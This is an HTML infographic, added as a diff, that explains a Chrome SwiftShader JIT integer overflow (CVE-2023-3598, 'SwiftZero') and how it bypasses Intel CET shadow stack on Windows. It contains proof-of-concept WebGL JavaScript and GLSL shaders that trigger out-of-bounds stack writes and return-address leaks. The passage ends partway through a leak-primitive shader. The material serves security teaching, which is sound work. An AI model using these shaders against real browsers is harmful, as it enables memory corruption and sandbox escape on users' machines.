@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Infographic: Bypassing Intel CET Shadow Stack</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Aptos', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            font-weight: 300; /* Light weight */
+            background-color: #000000;
+            color: #EAEAEA;
+        }
+        
+        /* Ensure ALL code elements use Consolas with better visibility */
+        code, 
+        pre, 
+        .code-block,
+        .stack-diagram,
+        .object-diagram,
+        .disassembly-line,
+        .offset,
+        pre code,
+        pre.line-numbers code {
+            font-family: 'Consolas', 'Courier New', monospace !important;
+            font-weight: 500 !important; /* Medium weight for better visibility */
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+        }
+        
+        /* Override Prism's font-family */
+        code[class*="language-"],
+        pre[class*="language-"] {
+            font-family: 'Consolas', 'Courier New', monospace !important;
+            font-weight: 500 !important; /* Medium weight */
+            font-size: 0.9rem !important; /* Slightly larger */
+            line-height: 1.5 !important; /* Better line spacing */
+        }
+        
+        /* Make inline code more visible */
+        code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 0.1rem 0.3rem;
+            border-radius: 3px;
+            font-weight: 600 !important;
+        }
+        
+        /* Ensure non-code elements use Aptos */
+        p, span, div, li, ul, ol, td, th, label, input, textarea, select, button {
+            font-family: inherit; /* Will inherit Aptos from body */
+        }
+        
+        /* Annotations should use Aptos, not Consolas */
+        .disassembly-line .annotation {
+            font-family: 'Aptos', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+            font-style: italic;
+        }
+        .code-block {
+            background-color: rgba(30,30,30,0.9); /* Darker background for better contrast */
+            border-left: 3px solid #FFFFFF;
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            white-space: pre-wrap;
+            font-size: 0.9rem; /* Slightly larger */
+        }
+        .stat-card {
+            background: rgba(0, 0, 0, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            transition: all 0.3s ease;
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            border-color: #FFFFFF;
+        }
+        h1, h2, h3, h4 {
+            font-family: 'Poppins', sans-serif;
+        }
+        .chart-container { 
+            position: relative; 
+            width: 100%; 
+            max-width: 600px; 
+            margin-left: auto; 
+            margin-right: auto; 
+            height: 300px;
+            max-height: 400px; 
+        }
+        @media (min-width: 768px) { 
+            .chart-container { 
+                height: 350px; 
+            } 
+        }
+        .stack-diagram {
+            font-size: 0.8rem;
+            line-height: 1.5;
+        }
+        .stack-box {
+            border: 1px solid #4A5568;
+            padding: 0.25rem 0.5rem;
+            margin-bottom: -1px;
+            color: #ffffff;
+            font-weight: bold;
+        }
+        .stack-label {
+            color: #ffffff;
+            font-size: 0.75rem;
+        }
+        .arrow {
+            color: #ffffff;
+        }
+        .highlight-red {
+            color: #F56565;
+            background-color: rgba(245, 101, 101, 0.1);
+        }
+        .highlight-green {
+            color: #68D391;
+        }
+        .highlight-yellow {
+            color: #F6E05E;
+        }
+        .highlight-blue {
+            color: #ede863;
+            background-color: rgba(99, 179, 237, 0.1);
+        }
+        .line-comment {
+            text-align: left !important;
+            margin-left: 0 !important;
+            padding-left: 0 !important;
+            font-weight: 600;
+        }
+        .exploit-chain-box {
+            border: 1px solid #000000;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            text-align: center;
+        }
+        .exploit-chain-arrow {
+            font-size: 2rem;
+            color: #A0AEC0;
+            margin: 0.5rem 0;
+        }
+        .disassembly-line {
+            display: flex;
+            align-items: center;
+        }
+        .disassembly-line .annotation {
+            margin-left: 2rem;
+            color: #A0AEC0;
+            font-style: italic;
+            font-family: 'Aptos', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+        }
+        .object-diagram {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            flex-wrap: wrap;
+        }
+        .object-box {
+            border: 1px solid #666;
+            background-color: #2D2D2D;
+            padding: 0.5rem;
+            border-radius: 0.25rem;
+        }
+        .object-field {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px dashed #444;
+            padding: 0.25rem 0;
+        }
+        .object-field:last-child {
+            border-bottom: none;
+        }
+        .offset {
+            color: #A0AEC0;
+            margin-right: 1rem;
+        }
+        .pointer-arrow {
+            font-size: 1.5rem;
+            color: #A0AEC0;
+        }
+        .timeline {
+            position: relative;
+            max-width: 36rem;
+            margin: 0 auto;
+        }
+        .timeline-item {
+            position: relative;
+            padding-left: 4rem;
+            padding-bottom: 2rem;
+            border-left: 2px solid #4A5568;
+        }
+        .timeline-item:last-child {
+            border-left-color: transparent;
+        }
+        .code-block .comment-red {
+            color: #F56565;
+            background-color: rgba(245, 101, 101, 0.1);
+        }
+        .code-block .comment-yellow {
+            color: #F6E05E;
+        }
+        .timeline-dot {
+            position: absolute;
+            left: -0.8rem;
+            top: 0;
+            width: 1.5rem;
+            height: 1.5rem;
+            border-radius: 9999px;
+            background-color: #000000;
+            border: 2px solid #FFFFFF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .timeline-year {
+            position: absolute;
+            left: -5rem;
+            top: 0.1rem;
+            width: 4rem;
+            text-align: right;
+            font-weight: bold;
+            color: #A0AEC0;
+        }
+        /* Line numbers styling */
+        pre.line-numbers {
+            position: relative;
+            padding-left: 3.8em;
+            counter-reset: linenumber;
+        }
+
+        pre.line-numbers > code {
+            position: relative;
+            white-space: inherit;
+        }
+
+        .line-numbers .line-numbers-rows {
+            position: absolute;
+            pointer-events: none;
+            top: 0;
+            font-size: 100%;
+            left: -3.8em;
+            width: 3em;
+            letter-spacing: -1px;
+            border-right: 1px solid #999;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .line-numbers-rows > span {
+            display: block;
+            counter-increment: linenumber;
+        }
+
+        .line-numbers-rows > span:before {
+            content: counter(linenumber);
+            color: #999;
+            display: block;
+            padding-right: 0.8em;
+            text-align: right;
+        }
+        
+        /* Custom line highlighting that works in PDFs */
+        .line-numbers-rows > span[data-highlighted="true"]:before {
+            color: #F6E05E;
+            font-weight: bold !important;
+        }
+        
+
+        /* Remove all background-based highlighting */
+        .line-highlight {
+            background: transparent !important;
+            background: none !important;
+        }
+    </style>
+</head>
+<!-- ...existing code... -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-glsl.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-nasm.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+<body class="antialiased">
+
+    <div class="container mx-auto px-4 py-8 md:py-16">
+
+        <header class="text-center mb-16 md:mb-24">
+            <h1 class="text-4xl md:text-6xl tracking-tight leading-tight text-white">Bypassing Intel CET Shadow Stack</h1>
+            <p class="text-lg md:text-xl text-gray-400 mt-4 max-w-3xl mx-auto">An infographic detailing the CVE-2023-3598 "SwiftZero" Chrome sandbox escape which bypasses Intel CET Shadow Stack on Windows x64.</p>
+        </header>
+
+        <!-- First Section CET Shadow Stack Example -->
+        <section id="fortress" class="mb-16 md:mb-24">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-12 text-white">Intel CET ShadowStack</h2>
+            <div class="grid md:grid-cols-2 gap-8 items-center">
+                <div class="stat-card">
+                    <h3 class="font-bold text-xl mb-3 text-white">A Hardware Defense</h3>
+                    <p class="text-gray-300">Intel's Control-flow Enforcement Technology (CET) is a hardware-level defense. Its key feature for this talk is the <span class="font-bold">Shadow Stack</span>, a CPU-protected stack that creates a secure record of return addresses to prevent backward-edge control flow attacks.</p>
+                </div>
+                <div class="stat-card">
+                     <h3 class="font-bold text-xl mb-3 text-white">The Audit</h3>
+                    <p class="text-gray-300">On every function return, the CPU compares the return address on the normal stack with the one on the Shadow Stack. If they mismatch, it triggers a hardware fault, terminating the process. This is designed to make return-oriented programming impossible.</p>
+                </div>
+            </div>
+
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Normal Function Call with CET</h3>
+                 <div class="stat-card p-8">
+                     <div class="grid md:grid-cols-2 gap-8 items-start">
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">1. Example Code</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers"><code class="language-cpp">
+void foo() { ... }
+
+void main() {
+  foo(); // <-- CALL
+  // <-- return addr is here
+}</code></pre>
+                             </div>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="text-lg font-semibold text-center mb-4 text-white">2. Resulting Stacks</h4>
+                             <div class="flex justify-center items-start space-x-4">
+                                 <div>
+                                     <div class="stack-label text-center">Call Stack</div>
+                                     <div class="stack-box">...</div>
+                                     <div class="stack-box highlight-green">return addr</div>
+                                     <div class="stack-box">foo() stack frame</div>
+                                 </div>
+                                 <div>
+                                     <div class="stack-label text-center">Shadow Stack</div>
+                                     <div class="stack-box">...</div>
+                                     <div class="stack-box highlight-green">return addr</div>
+                                 </div>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-4">The call instruction pushes the return address to both stacks simultaneously.</p>
+                             
+                             <!-- Shadow Stack Violation Example -->
+                             <div class="mt-8 pt-8 border-t border-gray-600">
+                                 <h4 class="text-lg font-semibold text-center mb-4 text-white">3. When Return Addresses Mismatch</h4>
+                                 <div class="flex justify-center items-start space-x-4">
+                                     <div>
+                                         <div class="stack-label text-center">Call Stack</div>
+                                         <div class="stack-box">...</div>
+                                         <div class="stack-box highlight-red">corrupted addr</div>
+                                         <div class="stack-box">foo() stack frame</div>
+                                     </div>
+                                     <div>
+                                         <div class="stack-label text-center">Shadow Stack</div>
+                                         <div class="stack-box">...</div>
+                                         <div class="stack-box highlight-green">real return addr</div>
+                                     </div>
+                                 </div>
+                                 <p class="text-center mt-4 font-semibold highlight-red">#CP Fault: Process Terminated</p>
+                                 <p class="text-center text-s text-gray-400 mt-2">CPU detects mismatch during RET instruction and triggers a hardware fault.</p>
+                             </div>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+
+            <!-- UPDATED DIAGRAMS -->
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">How CET Defeats ROP</h3>
+                 <div class="stat-card p-8">
+                     <div class="grid md:grid-cols-2 gap-8 items-start">
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">1. ROP Gadget</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers"><code class="language-nasm">pop rcx
+ret</code></pre>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-2">A typical gadget found in legitimate code.</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-4 text-white">2. Hijack Attempt</h4>
+                             <div class="flex justify-center items-start space-x-4">
+                                 <div>
+                                     <div class="stack-label text-center">Call Stack</div>
+                                     <div class="stack-box">...</div>
+                                     <div class="stack-box highlight-red">ROP gadget addr</div>
+                                     <div class="stack-box">value for RCX</div>
+                                 </div>
+                                 <div>
+                                     <div class="stack-label text-center">Shadow Stack</div>
+                                     <div class="stack-box">...</div>
+                                     <div class="stack-box">legitimate Addr</div>
+                                 </div>
+                             </div>
+                             <p class="text-center mt-4 font-semibold highlight-red">MISMATCH: #CP Fault on ret</p>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">How CET Hinders JOP</h3>
+                 <div class="stat-card p-8">
+                     <div class="grid md:grid-cols-2 gap-8 items-start">
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">1. JOP Gadget</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers"><code class="language-nasm">mov rcx, [rbx]
+jmp rcx ; <-- VirtualProtect</code></pre>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-2">A gadget to perform an action and jump.</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-4 text-white">2. Hijack Attempt</h4>
+                             <div class="text-center">
+                                 <div class="stack-box">Hijacks control to a JOP gadget</div>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box">JOP gadget jumps to VirtualProtect</div>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box">VirtualProtect finishes and executes ret</div>
+                                 <p class="arrow text-s text-gray-400">Shadow Stack still expects original return address.</p>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <p class="font-semibold highlight-red">MISMATCH: #CP Fault on ret</p>
+                             </div>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">How CET Hinders COP</h3>
+                 <div class="stat-card p-8">
+                     <div class="grid md:grid-cols-2 gap-8 items-start">
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">1. COP Gadget Reality</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="3,4,5,6,7"><code class="language-nasm">; COP gadget found in real code
+mov rdx, [rax+0x20]    ; Load VirtualProtect addr
+call rdx               ; Call VirtualProtect - SUCCESS!
+mov rbx, [rax+0x30]    ; ← VirtualProtect returns HERE
+add rsp, 0x28          ; Unwanted stack manipulation
+pop r14                ; Destroys register state
+</code></pre>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-2">Real gadgets have problematic instructions that destroy control flow.</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-4 text-white">2. Why COP Can Fail</h4>
+                             <div class="text-center">
+                                 <div class="stack-box">Attacker controls [rax+0x20] = &VirtualProtect</div>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box highlight-green">call rdx → VirtualProtect()</div>
+                                 <p class="arrow text-s text-gray-400">Shadow Stack: must return to line 4</p>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box highlight-green">VirtualProtect() executes & returns</div>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box highlight-red">Returns to line 4 (unwanted!)</div>
+                                 <p class="arrow text-s text-gray-400">Stack manipulation destroys control</p>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <div class="stack-box highlight-red">add rsp, 0x28; pop r14</div>
+                                 <p class="arrow text-2xl font-bold">↓</p>
+                                 <p class="font-semibold highlight-red">Control flow completely lost</p>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-4">COP can call one function, but can't skip the destructive instructions that follow.</p>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+            <div class="mt-16">
+                <h3 class="text-2xl font-bold text-center mb-8 text-white">The Road to CET</h3>
+                <div class="stat-card p-8">
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <div class="timeline-dot bg-gray-700 border-gray-500"></div>
+                            <div class="timeline-year">2016</div>
+                            <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                                <div class="font-semibold text-white mb-2">Intel Publishes CET Specs</div>
+                                <p class="text-sm text-gray-400">The initial specification is released to give the software ecosystem time to prepare.</p>
+                            </div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot bg-gray-600 border-gray-400"></div>
+                            <div class="timeline-year">2020</div>
+                            <div class="p-4 bg-gray-600 border border-gray-400 rounded-lg">
+                                <div class="font-semibold text-white mb-2">Hardware & OS Support Arrives</div>
+                                <p class="text-sm text-gray-400">Intel releases 11th Gen "Tiger Lake" CPUs with CET. Microsoft enables "Hardware-enforced Stack Protection" in Windows 10 (20H1).</p>
+                            </div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot bg-gray-800 border-gray-600"></div>
+                            <div class="timeline-year">2021</div>
+                            <div class="p-4 bg-gray-800 border border-gray-600 rounded-lg">
+                                <div class="font-semibold text-white mb-2">Browser Adoption Begins</div>
+                                <p class="text-sm text-gray-400">Google starts enabling CET support for <span class="font-bold text-white">Chrome 90</span>.</p>
+                            </div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot bg-gray-700 border-gray-500"></div>
+                            <div class="timeline-year">2022</div>
+                            <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                                <div class="font-semibold text-white mb-2">Protection Extends to the Core</div>
+                                <p class="text-sm text-gray-400">Microsoft introduces Kernel-mode Hardware-enforced Stack Protection in Windows 11 (22H2).</p>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-center text-gray-400 mt-6 text-sm">CET's deployment was a multi-year collaboration between hardware, OS, and application vendors.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="blueprint" class="mb-16 md:mb-24">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-12 text-white">Windows' Compatibility Mode</h2>
+            <p class="text-center text-white max-w-3xl mx-auto mb-12">Windows doesn't just turn CET on. It uses a flexible "Hardware-enforced Stack Protection" (HSP) system. This compatibility mode creates specific rules that an attacker can potentially exploit.</p>
+            <div class="stat-card p-8">
+                <h3 class="font-bold text-xl text-center mb-8 text-white">Kernel Fault Investigation Logic</h3>
+                
+                <!-- Initial Trigger -->
+                <div class="flex justify-center mb-6">
+                    <div class="text-center">
+                        <div class="p-4 bg-gray-800 border border-gray-600 rounded-lg font-semibold text-white">#CP Fault Triggered</div>
+                        <p class="text-s text-white mt-1">CPU detects mismatch</p>
+                    </div>
+                </div>
+                
+                <!-- Arrow down -->
+                <div class="flex justify-center mb-6">
+                    <div class="text-2xl text-white">↓</div>
+                </div>
+                
+                <!-- Kernel Investigation -->
+                <div class="flex justify-center mb-8">
+                    <div class="text-center">
+                        <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg font-semibold text-white">Kernel Investigates</div>
+                        <p class="text-s text-white mt-1">KiControlProtectionFault</p>
+                    </div>
+                </div>
+                
+                <!-- Decision Flow -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-4xl mx-auto">
+                    <!-- Left Column: ALLOW cases -->
+                    <div class="space-y-4">
+                        <h4 class="text-center font-semibold text-white mb-4">ALLOW Cases</h4>
+                        
+                        <div class="text-center">
+                            <div class="p-3 bg-gray-600 border border-gray-400 rounded-lg text-sm text-white">
+                                Return address found on ShadowStack?
+                            </div>
+                            <p class="text-s text-green-400 mt-1 font-semibold">ALLOW</p>
+                            <p class="text-s text-white">Legitimate return</p>
+                        </div>
+                        
+                        <div class="text-center">
+                            <div class="p-3 bg-gray-600 border border-gray-400 rounded-lg text-sm text-white">
+                                Return from non-CETCOMPAT dynamic code?
+                            </div>
+                            <p class="text-s text-green-400 mt-1 font-semibold">ALLOW</p>
+                            <p class="text-s text-white">JIT/interpreted code exemption</p>
+                        </div>
+                        
+                        <div class="text-center">
+                            <div class="p-3 bg-gray-600 border border-gray-400 rounded-lg text-sm text-white">
+                                Return from non-CETCOMPAT module?
+                            </div>
+                            <p class="text-s text-green-400 mt-1 font-semibold">ALLOW</p>
+                            <p class="text-s text-white">Legacy compatibility</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Right Column: TERMINATE cases -->
+                    <div class="space-y-4">
+                        <h4 class="text-center font-semibold text-white mb-4">TERMINATE Cases</h4>
+                        
+                        <div class="text-center">
+                            <div class="p-3 bg-gray-800 border border-gray-600 rounded-lg text-sm text-white">
+                                Return from CETCOMPAT code without valid ShadowStack entry?
+                            </div>
+                            <p class="text-s text-red-400 mt-1 font-semibold">TERMINATE</p>
+                            <p class="text-s text-white">CET violation detected</p>
+                        </div>
+                        
+                        <div class="text-center">
+                            <div class="p-3 bg-gray-800 border border-gray-600 rounded-lg text-sm text-white">
+                                Return from CETCOMPAT module with mismatch?
+                            </div>
+                            <p class="text-s text-red-400 mt-1 font-semibold">TERMINATE</p>
+                            <p class="text-s text-white">CET violation detected</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Key Insight -->
+                <div class="mt-8 p-4 bg-gray-800 border border-gray-500 rounded-lg">
+                    <div class="flex items-center justify-center mb-2">
+                        <h4 class="font-semibold text-yellow-400">Key Insight</h4>
+                    </div>
+                    <p class="text-center text-white text-sm">The kernel's compatibility exemptions for <span class="font-bold text-green-400">non-CETCOMPAT dynamic code</span> (like JIT-compiled shaders) create a bypass opportunity. SwiftShader's JIT code is exempt from CET enforcement, allowing our exploit to work.</p>
+                </div>
+            </div>
+        </section>
+        
+        <section id="crack" class="mb-16 md:mb-24">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-12 text-white">The SwiftZero Bug (CVE-2023-3598)</h2>
+             <p class="text-center text-gray-400 max-w-3xl mx-auto mb-12">The vulnerability (CVE-2023-3598) lies within SwiftShader's JIT compiler. A 32-bit integer overflow when calculating stack space for large shader variables leads to a classic stack buffer overflow.</p>
+            <a class="text-blue-500 hover:underline mb-8 block text-center" href="http://varko.xyz/shadertoy_plus_plus_chrome_0day_sisu_statement.html">Learn more</a>
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">The Vulnerable Code: Cfg::sortAndCombineAllocas</h3>
+                 <div class="stat-card p-6">
+                     <div class="code-block text-s mb-3">
+<pre class="line-numbers" data-line="7,17,21,25"><code class="language-cpp">void Cfg::sortAndCombineAllocas(CfgVector&lt;InstAlloca *&gt; &Allocas,
+                                uint32_t CombinedAlignment, InstList &Insts,
+                                AllocaBaseVariableType BaseVariableType) {
+  if (Allocas.empty())
+    return;
+    ...
+  uint32_t CurrentOffset = 0;  // 32-bit integer can overflow!
+  CfgVector&lt;int32_t&gt; Offsets;
+  
+  // The vulnerable loop:
+  for (Inst *Instr : Allocas) {
+    auto *Alloca = llvm::cast&lt;InstAlloca&gt;(Instr);
+    uint32_t Alignment = std::max(Alloca->getAlignInBytes(), 1u);
+    auto *ConstSize = 
+        llvm::dyn_cast&lt;ConstantInteger32&gt;(Alloca->getSizeInBytes());
+    // Size can be controlled by attacker via shader code
+    uint32_t Size = Utils::applyAlignment(ConstSize->getValue(), Alignment);
+    
+    ...
+    Offsets.push_back(...);
+    CurrentOffset += Size;  // INTEGER OVERFLOW HERE!
+  }
+  
+  // Round the offset up to the alignment granularity to use as the size
+  uint32_t TotalSize = Utils::applyAlignment(CurrentOffset, CombinedAlignment);
+  ...
+}</code></pre>
+                     </div>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 7:</span> CurrentOffset is a 32-bit unsigned integer that can overflow</p>
+                     <p class="text-s line-comment"><span class="highlight-yellow">Line 17:</span> Size can be controlled by attacker via shader code</p>
+                     <p class="text-s line-comment"><span class="highlight-yellow">Line 21:</span> Integer overflow occurs here when CurrentOffset wraps around</p>
+                     <p class="text-s line-comment"><span class="highlight-yellow">Lines 25:</span> The overflowed value leads to an undersized allocation</p>
+                     <p class="text-center text-gray-400 mt-3 text-s">You can craft shader variables large enough to cause <code>CurrentOffset</code> to wrap around, resulting in an undersized stack frame allocation.</p>
+                     <a class="text-blue-500 hover:underline mt-4 block text-center" href="https://github.com/niudong1001/pnacl-subzero/blob/a018d6e2dc9b3f0b1a48d1deade8160e44589189/src/IceCfg.cpp#L928">View the full source code on GitHub</a>
+                 </div>
+            </div>            
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Compiling a Shader</h3>
+                 <div class="stat-card p-6">
+                     <div class="code-block text-s mb-3">
+<pre class="line-numbers" data-line="14"><code class="language-cpp">(() => {
+    // Create a temporary canvas to get a WebGL2 context
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl2');
+
+    if (!gl) {
+        console.error("WebGL 2 is not available on your browser.");
+        return;
+    }
+
+    // A simple, valid vertex shader
+    const vsSource = `
+        #version 300 es
+        mat4 buf[0xffffff]; // Trigger the overflow in sortAndCombineAllocas
+        void main() {
+            buf[1][2][3]=uintBitsToFloat(0x41414141);
+    }`;
+
+    // --- The Compilation Process ---
+    const shader = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(shader, vsSource);
+    gl.compileShader(shader);
+
+    // --- Check the Result ---
+    if (gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+        console.log("Shader compiled successfully!");
+    } else {
+        console.error("Shader compilation failed:");
+        console.error(gl.getShaderInfoLog(shader));
+    }
+})();
+</code></pre>
+                     </div>
+                     <p class="text-center text-gray-400 mt-3 text-s">Client-Side Shader Compilation via WebGL2 using JavaScript</p>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 14:</span> Large array triggers integer overflow</p>
+                 </div>
+            </div>
+
+    <div class="mt-16">
+        <div class="text-center mb-12">
+            <h3 class="text-2xl font-bold text-center mb-8 text-white">Memory Corruption: Out-of-Bounds Write</h3>
+            <div class="stat-card p-6">
+                     <div class="grid lg:grid-cols-2 gap-6">
+                         <div>
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">1. Shader Code</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="4,7"><code class="language-glsl">
+#version 300 es
+// Trigger integer overflow in sortAndCombineAllocas
+mat4 buf[0xffffff];
+void main() {
+  // These writes go out of bounds
+  buf[1][2][3]=uintBitsToFloat(0x41414141);
+}</code></pre>
+                             </div>
+                             <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 4:</span> Large array triggers integer overflow</p>
+                             <p class="text-s line-comment"><span class="highlight-yellow">Line 7:</span> Out-of-bounds write overwrites return address</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">2. Result: Memory Corruption</h4>
+                             <div class="stack-label font-semibold text-center mb-1">Memory Layout</div>
+                             <div class="stack-box bg-red-900/50 border-red-500 text-s py-1">Target: 0x4141414141414141 (return addr)</div>
+                             <div class="stack-box border-dashed border-gray-600 text-s py-1">...writable memory in between...</div>
+                             <div class="stack-box bg-green-900/50 border-green-500 text-s py-1">Array bounds end here</div>
+                             <div class="stack-box bg-yellow-900/50 border-yellow-500 text-s py-1">buf[0xffffff]</div>
+                             <p class="text-center font-semibold text-white-400 mt-3">Reading past array bounds exposes sensitive stack data like the return addresses.</p>
+                         </div>
+                     </div>
+                 </div>
+        </section>
+
+        <section class="mb-16 md:mb-24">
+            <div class="text-center mb-12">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Information Disclosure: Out-of-Bounds Read</h3>
+                 <div class="stat-card p-6">
+                     <div class="grid lg:grid-cols-2 gap-6">
+                         <div>
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">1. Shader Code</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="4,8"><code class="language-glsl">
+#version 300 es
+// Trigger integer overflow in sortAndCombineAllocas
+mat4 buf[0xfffffff];
+flat out uint returnAddr;
+void main() {
+    // These reads go out of bounds
+    returnAddr = floatBitsToUint(buf[1][2][3]);
+}
+</code></pre>
+                             </div>
+                             <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 4:</span> Large array triggers integer overflow</p>
+                             <p class="text-s line-comment"><span class="highlight-yellow">Line 8:</span> Out-of-bounds read leaks return address</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">2. Result: Memory Disclosure</h4>
+                             <div class="stack-label font-semibold text-center mb-1">Memory Layout</div>
+                             <div class="stack-box bg-red-900/50 border-red-500 text-s py-1">Target: 0x7fff12345678 (return addr)</div>
+                             <div class="stack-box border-dashed border-gray-600 text-s py-1">...readable memory in between...</div>
+                             <div class="stack-box bg-green-900/50 border-green-500 text-s py-1">Array bounds end here</div>
+                             <div class="stack-box bg-yellow-900/50 border-yellow-500 text-s py-1">buf[0xffffff]</div>
+                             <p class="text-center font-semibold text-white-400 mt-3">Reading past array bounds exposes sensitive stack data like the return addresses.</p>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+
+        </section>
+
+        <section class="mb-16 md:mb-24">
+            <div class="text-center mb-12">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Allocation and Leak Primitive</h3>
+                 <div class="stat-card p-6">
+                     <div class="grid lg:grid-cols-2 gap-6">
+                         <div>
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">1. Shader Code</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="3,13,14,15,17"><code class="language-glsl">
+#version 300 es
+mat4 buf[0xffffff];
+flat out uint value;
+layout(std140) uniform Buffer {
+    uint value[0x100];
+} buffer;
+uint extra[0x10];
+
+void main() {
+    // Read and write operations to
+    // avoid compiler optimizations
